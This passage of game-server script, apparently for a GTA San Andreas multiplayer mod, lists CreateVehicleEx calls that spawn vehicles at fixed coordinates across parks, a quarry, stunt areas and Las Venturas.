	CreateVehicleEx(429,2152.9357,2475.6223,10.4999,269.3425,-1,-1,respawntime,0,0); // [Banshee] Park3
	CreateVehicleEx(480,2564.1230,2249.5710,10.5908,88.4444,-1,-1,respawntime,0,0); // [Comet] Park4
	CreateVehicleEx(534,2563.5153,2279.8061,10.5447,88.1761,-1,-1,respawntime,0,0); // [Remington] Park4
	CreateVehicleEx(545,2592.7917,2267.7426,10.6313,270.0467,-1,-1,respawntime,0,0); // [Hustler] Park4
	CreateVehicleEx(542,2612.2512,2274.9812,10.5635,89.6281,-1,-1,respawntime,0,0); // [Clover] Park4
	CreateVehicleEx(588,2489.1767,2010.0197,10.7236,179.4992,-1,-1,respawntime,0,0); // [Hotdog] Park4
	CreateVehicleEx(429,2472.2822,1990.2187,10.4999,359.9802,-1,-1,respawntime,0,0); // [Banshee] Park4
	CreateVehicleEx(411,2486.2722,1991.7629,10.5473,180.5130,-1,-1,respawntime,0,0); // [Infernus] Park4
	CreateVehicleEx(579,2441.6230,2021.0659,10.7867,270.3064,-1,-1,respawntime,0,0); // [Huntley] Park4
	CreateVehicleEx(451,2453.8090,1990.7073,10.5259,0.2907,-1,-1,respawntime,0,0); // [Turismo] Park4
	CreateVehicleEx(429,2440.8784,2005.2502,10.5000,270.6143,-1,-1,respawntime,0,0); // [Banshee] Park4
	CreateVehicleEx(451,2562.9418,1868.1179,10.5291,269.9523,-1,-1,respawntime,0,0); // [Turismo] Park5
	CreateVehicleEx(443,2583.2736,1892.7521,11.4561,179.2834,-1,-1,respawntime,0,0); // [Packer] Park5
	CreateVehicleEx(521,2630.9567,1838.7093,10.3873,268.5615,-1,-1,respawntime,0,0); // [FCR-900] Park5
	CreateVehicleEx(521,2624.6101,1896.8405,10.3899,175.3168,-1,-1,respawntime,0,0); // [FCR-900] Park5
	CreateVehicleEx(403,2629.5656,1809.0112,11.4270,89.2492,-1,-1,respawntime,0,0); // [Linerunner] Park5
	CreateVehicleEx(402,2591.5773,1786.3090,10.7914,269.6628,-1,-1,respawntime,0,0); // [Buffalo] Park5
	CreateVehicleEx(402,2591.5368,1789.4047,10.8184,267.4169,-1,-1,respawntime,0,0); // [Buffalo] Park5
	CreateVehicleEx(482,2631.2556,1665.2414,10.9792,271.0726,-1,-1,respawntime,0,0); // [Burrito] Park5
	CreateVehicleEx(411,2602.6379,1799.0817,10.5473,270.2078,-1,-1,respawntime,0,0); // [Infernus] Park5
	CreateVehicleEx(569,2596.3142,1783.1973,10.8203,358.6870,-1,-1,respawntime,0,0); // [Freight] Park5
	CreateVehicleEx(569,2599.1357,1770.4389,11.4535,293.0123,-1,-1,respawntime,0,0); // [Freight] Park5
	CreateVehicleEx(504,2631.3830,1781.9855,10.6125,90.2700,-1,-1,respawntime,0,0); // [Bloodring Banger] Park5
	CreateVehicleEx(500,2599.5551,1678.1395,10.9598,89.3710,-1,-1,respawntime,0,0); // [Mesa] Park5
	CreateVehicleEx(434,2591.9179,1815.0854,10.7841,89.8005,-1,-1,respawntime,0,0); // [Hotknife] Park5
	CreateVehicleEx(517,2591.3518,1846.7119,10.6752,90.7030,-1,-1,respawntime,0,0); // [Majestic] Park5
	CreateVehicleEx(451,2598.6149,1700.3934,10.5251,91.7642,-1,-1,respawntime,0,0); // [Turismo] Park5
	CreateVehicleEx(438,2455.3266,1358.0269,10.8236,180.4175,-1,-1,respawntime,0,0); // [Cabbie] Park6
	CreateVehicleEx(587,2441.4821,1345.4671,10.5482,270.7922,-1,-1,respawntime,0,0); // [Euros] Park6
	CreateVehicleEx(522,2447.7302,1325.6274,10.3870,179.2927,-1,-1,respawntime,0,0); // [NRG-500] Park6
	CreateVehicleEx(562,2474.5712,1357.6096,10.4354,176.4379,-1,-1,respawntime,0,0); // [Elegy] Park6
	CreateVehicleEx(541,2451.0231,1326.8248,10.4467,178.2286,-1,-1,respawntime,0,0); // [Bullet] Park6
	CreateVehicleEx(415,2464.8940,1336.7780,10.5748,179.9557,-1,-1,respawntime,0,0); // [Cheetah] Park6
	CreateVehicleEx(578,2444.0639,1358.9821,11.4449,269.3359,-1,-1,respawntime,0,0); // [DFT-30] Park6
	CreateVehicleEx(420,1709.2637,1450.9936,10.5331,164.6617,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(420,1717.0666,1427.7424,10.3433,6.7782,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(420,1736.5009,1524.7192,10.5180,182.5129,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(420,1706.8503,1429.5727,10.3554,180.9558,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(420,1728.6418,1652.9390,9.5995,212.0681,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(420,1740.2834,1620.9077,8.7796,164.2161,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(420,1701.7041,1316.7429,10.6002,179.4892,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(420,1688.9918,1297.0665,10.6001,179.9476,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(420,1660.1163,1296.5667,10.6013,179.3991,-1,-1,respawntime,0,0); // [Taxi] LV TaxiStation
	CreateVehicleEx(409,1712.6223,1288.7270,10.6202,359.5124,-1,-1,respawntime,0,0); // [Stretch] LV TaxiStation
	CreateVehicleEx(438,1672.9444,1306.5155,10.8234,0.7784,-1,-1,respawntime,0,0); // [Cabbie] LV TaxiStation
	CreateVehicleEx(438,1650.5650,1315.9171,10.8205,180.3409,-1,-1,respawntime,0,0); // [Cabbie] LV TaxiStation
	CreateVehicleEx(434,1657.0311,1317.1778,10.7929,179.8197,-1,-1,respawntime,0,0); // [Hotknife] LV TaxiStation
	CreateVehicleEx(522,1788.8192,-1308.7520,131.2534,90.0625,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(522,1788.9420,-1306.3916,131.3034,93.5682,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(522,1788.8162,-1303.7520,131.2545,90.0625,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(522,1788.8093,-1301.2520,131.2956,90.0625,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(522,1788.7905,-1298.7512,131.2975,90.1561,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(522,1784.0576,-1302.4022,131.3029,86.2895,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(522,1783.9996,-1305.1108,131.3034,87.5158,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(522,1794.4429,-1300.0949,131.2968,89.3841,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(522,1794.9533,-1306.9390,131.2985,91.6760,-1,-1,respawntime,0,31); // [NRG-500] Extreme
	CreateVehicleEx(411,1822.5960,-1308.9194,131.4628,89.0177,-1,-1,respawntime,0,31); // [Infernus] Extreme
	CreateVehicleEx(411,1822.5218,-1304.2678,131.4614,90.4658,-1,-1,respawntime,0,31); // [Infernus] Extreme
	CreateVehicleEx(411,1822.4676,-1299.7828,131.4562,91.4467,-1,-1,respawntime,0,31); // [Infernus] Extreme
	CreateVehicleEx(411,1822.2261,-1294.9835,131.4400,88.6813,-1,-1,respawntime,0,31); // [Infernus] Extreme
	CreateVehicleEx(524,681.9531,918.2207,-39.6848,139.4566,-1,-1,respawntime,0,0); // [Cement Truck] Quarry
	CreateVehicleEx(468,541.0493,879.7657,-35.9425,252.9163,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(468,541.6212,882.6049,-35.9935,260.5385,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(532,692.9754,903.1846,-38.2003,110.2333,-1,-1,respawntime,0,0); // [Combine] Quarry
	CreateVehicleEx(532,652.0796,818.0108,-41.9611,74.3315,-1,-1,respawntime,0,0); // [Combine] Quarry
	CreateVehicleEx(406,670.0223,926.8825,-39.2711,152.2482,-1,-1,respawntime,0,0); // [Dumper] Quarry
	CreateVehicleEx(406,619.6656,813.2732,-41.4619,350.4642,-1,-1,respawntime,0,0); // [Dumper] Quarry
	CreateVehicleEx(531,644.9799,858.5205,-42.7179,193.6423,-1,-1,respawntime,0,0); // [Tractor] Quarry
	CreateVehicleEx(531,630.7576,825.2986,-42.8895,355.5146,-1,-1,respawntime,0,0); // [Tractor] Quarry
	CreateVehicleEx(486,596.4992,833.5879,-42.9554,319.8969,-1,-1,respawntime,0,0); // [Dozer] Quarry
	CreateVehicleEx(486,590.6231,841.4402,-42.4344,309.9643,-1,-1,respawntime,0,0); // [Dozer] Quarry
	CreateVehicleEx(486,630.3843,856.8535,-42.7422,270.4558,-1,-1,respawntime,0,0); // [Dozer] Quarry
	CreateVehicleEx(408,614.6109,889.5836,-42.5027,120.3898,-1,-1,respawntime,0,0); // [Trashmaster] Quarry
	CreateVehicleEx(455,591.4897,915.1953,-42.6227,251.9316,-1,-1,respawntime,0,0); // [Flatbed] Quarry
	CreateVehicleEx(525,690.1004,869.8908,-41.3115,80.4101,-1,-1,respawntime,0,0); // [Tow Truck] Quarry
	CreateVehicleEx(530,596.4478,877.6834,-43.4565,271.6205,-1,-1,respawntime,0,0); // [Forklift] Quarry
	CreateVehicleEx(530,588.6179,881.7721,-44.6205,1.9962,-1,-1,respawntime,0,0); // [Forklift] Quarry
	CreateVehicleEx(530,596.5234,875.3990,-43.3916,276.7288,-1,-1,respawntime,0,0); // [Forklift] Quarry
	CreateVehicleEx(568,473.0819,886.9749,-29.7219,265.8895,-1,-1,respawntime,0,0); // [Bandito] Quarry
	CreateVehicleEx(568,473.0002,871.7554,-29.4168,277.8538,-1,-1,respawntime,0,0); // [Bandito] Quarry
	CreateVehicleEx(468,692.5458,852.2646,-43.2914,60.2894,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(468,693.7799,855.3897,-43.2930,62.7887,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(468,686.0061,839.1748,-43.2926,54.7834,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(468,681.8308,831.3237,-43.2917,65.6740,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(468,489.3296,784.4515,-22.3431,312.8350,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(468,499.1890,779.9998,-21.8253,335.2678,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(468,492.4440,782.5889,-22.4177,331.1248,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(468,496.3673,781.4453,-22.1228,334.2186,-1,-1,respawntime,0,0); // [Sanchez] Quarry
	CreateVehicleEx(451,1004.8281,2459.4922,10.5223,180.4709,1,1,respawntime,0,0); // [Turismo] Drag
	CreateVehicleEx(411,1009.8281,2459.4922,10.5277,180.4709,0,0,respawntime,0,0); // [Infernus] Drag
	CreateVehicleEx(522,24.469158,2479.404052,16.502862,360.120544,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,30.469144,2479.416748,16.502862,360.120544,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,36.469131,2479.429443,16.502862,360.120544,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,42.469116,2479.442138,16.502862,360.120544,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,48.469100,2479.454833,16.502862,360.120544,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,54.469085,2479.467529,16.502862,360.120544,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(451,56.691223,2512.675537,16.502862,180.524291,-1,-1,respawntime,0,0); // [Turismo] AS
	CreateVehicleEx(451,50.691474,2512.620605,16.502862,180.524291,-1,-1,respawntime,0,0); // [Turismo] AS
	CreateVehicleEx(451,44.691726,2512.565673,16.502862,180.524291,-1,-1,respawntime,0,0); // [Turismo] AS
	CreateVehicleEx(411,39.0824,2512.8083,16.2386,180.524291,-1,-1,respawntime,0,0); // [Infernus] AS
	CreateVehicleEx(411,33.418071,2512.822753,17.871288,180.524291,-1,-1,respawntime,0,0); // [Infernus] AS
	CreateVehicleEx(411,28.625251,2512.819335,17.887813,180.524291,-1,-1,respawntime,0,0); // [Infernus] AS
	CreateVehicleEx(522,385.541320,2471.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.539947,2467.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.538574,2463.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.537200,2459.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.535827,2455.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.534454,2451.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.533081,2447.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.531707,2443.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.530334,2439.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,385.528961,2435.598144,16.500000,269.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.541320,2471.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.539947,2467.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.538574,2463.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.537200,2459.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.535827,2455.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.534454,2451.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.533081,2447.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.531707,2443.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.530334,2439.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,424.528961,2435.598144,16.500000,89.980224,-1,-1,respawntime,0,0); // [NRG-500] AS
	CreateVehicleEx(522,-1486.8758,-229.0402,13.7160,91.9954,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(523,-1467.5002,-232.5177,5.5901,0.0174,-1,-1,respawntime,0,0); // [HPV1000] Stunts
	CreateVehicleEx(522,-1486.4892,-226.1490,13.7193,81.7584,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1487.5260,-238.4504,13.7196,85.0927,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1487.4155,-235.5799,13.6830,79.5810,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1487.0562,-231.1707,13.7180,91.6029,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1487.3105,-233.2371,13.7139,88.9640,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1486.4632,-223.4637,13.7224,83.5231,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1488.3165,-245.7741,13.7196,91.1084,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1487.4945,-240.6790,13.7157,82.4941,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1488.0235,-243.4257,13.7123,90.6575,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1486.4742,-221.0459,13.7185,87.0596,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1486.2178,-218.3849,13.7196,85.6849,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1514.9843,-255.3004,6.8418,34.5915,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1514.4495,-253.8590,7.0794,243.3434,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1488.0484,-248.1763,13.7194,89.8313,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1487.9578,-250.7292,13.7197,91.0935,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(411,-1437.6139,-175.5389,13.8839,74.0011,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(411,-1439.7584,-181.7447,13.8888,73.7453,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(411,-1441.9408,-188.5974,13.8890,71.2071,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(411,-1444.2323,-194.9526,13.8891,70.2583,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(411,-1475.5425,-210.4978,13.8755,354.4966,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(431,-2342.0029,-1594.7097,483.7290,240.2170,-1,-1,respawntime,0,0); // [Bus] CT
	CreateVehicleEx(431,-2349.5391,-1616.2777,483.8123,246.0461,-1,-1,respawntime,0,0); // [Bus] CT
	CreateVehicleEx(424,-2346.1667,-1603.0963,483.4094,245.1376,-1,-1,respawntime,0,0); // [BF Injection] CT
	CreateVehicleEx(424,-2348.3811,-1608.0732,483.3931,246.2287,-1,-1,respawntime,0,0); // [BF Injection] CT
	CreateVehicleEx(471,-2354.8882,-1625.7550,483.1546,251.8927,-1,-1,respawntime,0,0); // [Quad] CT
	CreateVehicleEx(471,-2356.5525,-1629.6368,483.1692,244.0939,-1,-1,respawntime,0,0); // [Quad] CT
	CreateVehicleEx(461,-2356.9546,-1636.4447,483.2849,282.0349,-1,-1,respawntime,0,0); // [PCJ-600] CT
	CreateVehicleEx(461,-2354.9622,-1640.2638,483.2888,304.0669,-1,-1,respawntime,0,0); // [PCJ-600] CT
	CreateVehicleEx(557,-2349.0771,-1649.4169,484.0781,299.0433,-1,-1,respawntime,0,0); // [Monster Truck C] CT
	CreateVehicleEx(557,-2344.2705,-1659.4182,484.0826,303.4067,-1,-1,respawntime,0,0); // [Monster Truck C] CT
	CreateVehicleEx(557,-2346.5093,-1654.0662,484.0529,296.0573,-1,-1,respawntime,0,0); // [Monster Truck C] CT
	CreateVehicleEx(571,-2341.4424,-1662.2817,482.9727,298.2068,-1,-1,respawntime,0,0); // [Kart] CT
	CreateVehicleEx(571,-2339.5857,-1665.2220,482.8967,306.4953,-1,-1,respawntime,0,0); // [Kart] CT
	CreateVehicleEx(503,-2286.5608,-1702.8640,478.0710,200.5657,-1,-1,respawntime,0,0); // [Hotring Racer] CT
	CreateVehicleEx(522,-2237.8660,-1714.1658,480.4250,188.5818,-1,-1,respawntime,0,0); // [NRG-500] CT
	CreateVehicleEx(487,-2295.3215,-1654.9983,483.3934,247.4106,-1,-1,respawntime,0,0); // [Maverick] CT
	CreateVehicleEx(487,-2290.4368,-1640.2369,483.8972,257.7176,-1,-1,respawntime,0,0); // [Maverick] CT
	CreateVehicleEx(487,-2285.9851,-1629.2147,483.9147,247.3682,-1,-1,respawntime,0,0); // [Maverick] CT
	CreateVehicleEx(451,2223.0498,1283.8073,10.4506,359.6867,-1,-1,respawntime,0,0); // [Turismo] Las Venturas
	CreateVehicleEx(495,1016.7677,1113.5672,11.1951,66.2225,-1,-1,respawntime,0,0); // [Sandking] Las Venturas
	CreateVehicleEx(495,1011.9813,1103.7580,11.1952,64.2649,-1,-1,respawntime,0,0); // [Sandking] Las Venturas
	CreateVehicleEx(495,1014.3435,1108.5313,11.1952,64.3600,-1,-1,respawntime,0,0); // [Sandking] Las Venturas
	CreateVehicleEx(510,976.9538,1108.5095,10.3617,1.3270,-1,-1,respawntime,0,0); // [Mountain Bike] Las Venturas
	CreateVehicleEx(510,976.9724,1103.8273,10.3987,352.9681,-1,-1,respawntime,0,0); // [Mountain Bike] Las Venturas
	CreateVehicleEx(510,976.9762,1112.9135,10.3780,351.9582,-1,-1,respawntime,0,0); // [Mountain Bike] Las Venturas
	CreateVehicleEx(462,977.7009,1140.0731,10.4194,273.5487,-1,-1,respawntime,0,0); // [Faggio] Las Venturas
	CreateVehicleEx(462,977.6875,1136.4067,10.4200,270.5398,-1,-1,respawntime,0,0); // [Faggio] Las Venturas
	CreateVehicleEx(462,977.7043,1138.4455,10.4197,274.8240,-1,-1,respawntime,0,0); // [Faggio] Las Venturas
	CreateVehicleEx(463,991.6023,1160.1884,10.3375,183.4742,-1,-1,respawntime,0,0); // [Freeway] Las Venturas
	CreateVehicleEx(463,986.8218,1160.1927,10.3605,182.0484,-1,-1,respawntime,0,0); // [Freeway] Las Venturas
	CreateVehicleEx(463,989.2113,1160.1995,10.3596,179.3157,-1,-1,respawntime,0,0); // [Freeway] Las Venturas
	CreateVehicleEx(554,1000.8508,1158.2821,10.7911,182.5612,-1,-1,respawntime,0,0); // [Yosemite] Las Venturas
	CreateVehicleEx(554,1005.4415,1158.2592,10.7630,180.6593,-1,-1,respawntime,0,0); // [Yosemite] Las Venturas
	CreateVehicleEx(554,1009.8572,1158.2636,10.7460,181.4157,-1,-1,respawntime,0,0); // [Yosemite] Las Venturas
	CreateVehicleEx(482,987.6755,1070.0510,10.9014,1.6487,-1,-1,respawntime,0,0); // [Burrito] Las Venturas
	CreateVehicleEx(482,992.0028,1070.3413,10.9014,1.3064,-1,-1,respawntime,0,0); // [Burrito] Las Venturas
	CreateVehicleEx(482,996.2843,1070.4064,10.8825,359.8829,-1,-1,respawntime,0,0); // [Burrito] Las Venturas
	CreateVehicleEx(483,1005.5686,1084.0240,10.8128,81.5135,-1,-1,respawntime,0,0); // [Camper] Las Venturas
	CreateVehicleEx(483,1005.9811,1087.9915,10.8129,83.6631,-1,-1,respawntime,0,0); // [Camper] Las Venturas
	CreateVehicleEx(411,2431.9167,1097.2580,10.4707,0.6054,-1,-1,respawntime,0,0); // [Infernus] Las Venturas
	CreateVehicleEx(541,2522.9025,1139.7348,10.3686,0.1928,-1,-1,respawntime,0,0); // [Bullet] Las Venturas
	CreateVehicleEx(506,2447.7509,1266.5592,10.5246,359.9406,-1,-1,respawntime,0,0); // [Super GT] Las Venturas
	CreateVehicleEx(565,2467.1833,1429.2956,10.4448,179.7792,-1,-1,respawntime,0,0); // [Flash] Las Venturas
	CreateVehicleEx(429,2472.6118,1404.3305,10.4772,270.2327,-1,-1,respawntime,0,0); // [Banshee] Las Venturas
	CreateVehicleEx(415,2504.3442,1409.9991,10.5920,89.4480,-1,-1,respawntime,0,0); // [Cheetah] Las Venturas
	CreateVehicleEx(508,1086.2567,1211.6905,10.8203,366.4319,-1,-1,respawntime,0,0); // [Journey] Las Venturas
	CreateVehicleEx(555,953.1240,1759.4621,8.3332,269.7043,-1,-1,respawntime,0,0); // [Windsor] Las Venturas
	CreateVehicleEx(555,983.4575,1720.6256,8.3396,271.4414,-1,-1,respawntime,0,0); // [Windsor] Las Venturas
	CreateVehicleEx(521,984.2815,1725.1199,8.2247,90.0469,-1,-1,respawntime,0,0); // [FCR-900] Las Venturas
	CreateVehicleEx(521,984.4029,1746.5097,8.2223,271.6867,-1,-1,respawntime,0,0); // [FCR-900] Las Venturas
	CreateVehicleEx(411,882.2717,2040.0091,11.1880,268.1153,-1,-1,respawntime,0,0); // [Infernus] Las Venturas
	CreateVehicleEx(567,932.7311,2012.0126,11.3277,89.4615,-1,-1,respawntime,0,0); // [Savanna] Las Venturas
	CreateVehicleEx(443,978.7307,2097.9165,11.4549,358.4101,-1,-1,respawntime,0,0); // [Packer] Las Venturas
	CreateVehicleEx(603,983.2709,1986.3466,11.3026,269.8653,-1,-1,respawntime,0,0); // [Phoenix] Las Venturas
	CreateVehicleEx(480,1033.2081,1920.3575,11.2398,90.5573,-1,-1,respawntime,0,0); // [Comet] Las Venturas
	CreateVehicleEx(603,1133.2529,2195.1586,16.5559,181.3077,-1,-1,respawntime,0,0); // [Phoenix] Las Venturas
	CreateVehicleEx(567,1109.8424,2261.8581,16.5960,0.9731,-1,-1,respawntime,0,0); // [Savanna] Las Venturas
	CreateVehicleEx(480,1126.3645,2320.2768,16.4929,271.0621,-1,-1,respawntime,0,0); // [Comet] Las Venturas
	CreateVehicleEx(507,1116.4641,2251.0107,16.5444,180.5460,-1,-1,respawntime,0,0); // [Elegant] Las Venturas
	CreateVehicleEx(411,1115.3435,2300.1120,10.5473,88.5476,-1,-1,respawntime,0,0); // [Infernus] Las Venturas
	CreateVehicleEx(451,1106.5633,2261.3581,10.5256,0.9555,-1,-1,respawntime,0,0); // [Turismo] Las Venturas
	CreateVehicleEx(541,1068.8510,2232.2541,10.4488,272.0927,-1,-1,respawntime,0,0); // [Bullet] Las Venturas
	CreateVehicleEx(565,2254.2731,2063.9184,10.3931,179.3166,-1,-1,respawntime,0,0); // [Flash] Las Venturas
	CreateVehicleEx(559,2245.6909,2046.4155,10.4964,271.0367,-1,-1,respawntime,0,0); // [Jester] Las Venturas
	CreateVehicleEx(561,2235.1586,2042.9133,10.5868,93.6818,-1,-1,respawntime,0,0); // [Stratum] Las Venturas
	CreateVehicleEx(587,2215.9086,2048.9580,10.5088,269.3289,-1,-1,respawntime,0,0); // [Euros] Las Venturas
	CreateVehicleEx(541,2186.7128,1982.8186,10.3867,90.3190,-1,-1,respawntime,0,0); // [Bullet] Las Venturas
	CreateVehicleEx(559,2186.9196,1999.7790,10.4457,90.0957,-1,-1,respawntime,0,0); // [Jester] Las Venturas
	CreateVehicleEx(588,1168.4208,2096.9860,10.7328,358.2063,-1,-1,respawntime,0,0); // [Hotdog] Las Venturas
	CreateVehicleEx(409,2126.7143,2337.6401,10.5422,90.8814,-1,-1,respawntime,0,0); // [Stretch] Las Venturas
	CreateVehicleEx(555,2626.6579,1138.9846,10.5048,179.8472,-1,-1,respawntime,0,0); // [Windsor] Las Venturas
	CreateVehicleEx(444,2460.0629,491.5760,-59.3148,171.7133,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(522,2464.2324,491.3900,-60.0932,176.9303,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(522,2473.7392,490.0747,-60.0948,164.9055,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(444,2446.9985,452.8370,-59.2940,335.6732,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(444,2426.8242,453.9837,-59.0113,352.3425,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(444,2468.3903,490.2920,-59.1624,167.1752,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(444,2416.5642,456.8997,-59.2507,355.4941,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(444,2435.5695,453.2668,-59.3293,354.9334,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(522,2440.9899,452.5260,-60.0938,0.0885,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(522,2431.4741,454.3822,-60.1036,354.1869,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(522,2421.1979,453.5814,-60.1137,349.7127,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(522,2451.2045,452.1120,-60.0938,351.3704,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(522,2411.7421,457.3659,-60.0905,355.4224,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(522,2424.8627,493.3226,-60.0975,173.3630,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(444,2456.4294,451.5370,-59.2589,355.8200,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(522,2461.1047,451.1849,-60.0931,350.8599,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(522,2434.6701,491.7886,-60.0928,177.4466,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(444,2430.5922,492.5775,-59.3015,173.6881,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(444,2439.3410,491.6685,-59.3015,175.8947,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(522,2444.6918,492.1751,-60.1053,177.3341,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(522,2455.1210,492.4281,-60.1126,178.9394,-1,-1,respawntime,0,0); // [NRG-500] Water2
	CreateVehicleEx(444,2449.8896,491.6377,-59.3040,171.5663,-1,-1,respawntime,0,0); // [Monster Truck A] Water2
	CreateVehicleEx(495,261.9817,1338.3736,10.8357,0.2512,-1,-1,respawntime,0,0); // [Sandking] Jeeps
	CreateVehicleEx(495,266.9809,1338.4045,10.5859,360.2514,-1,-1,respawntime,0,0); // [Sandking] Jeeps
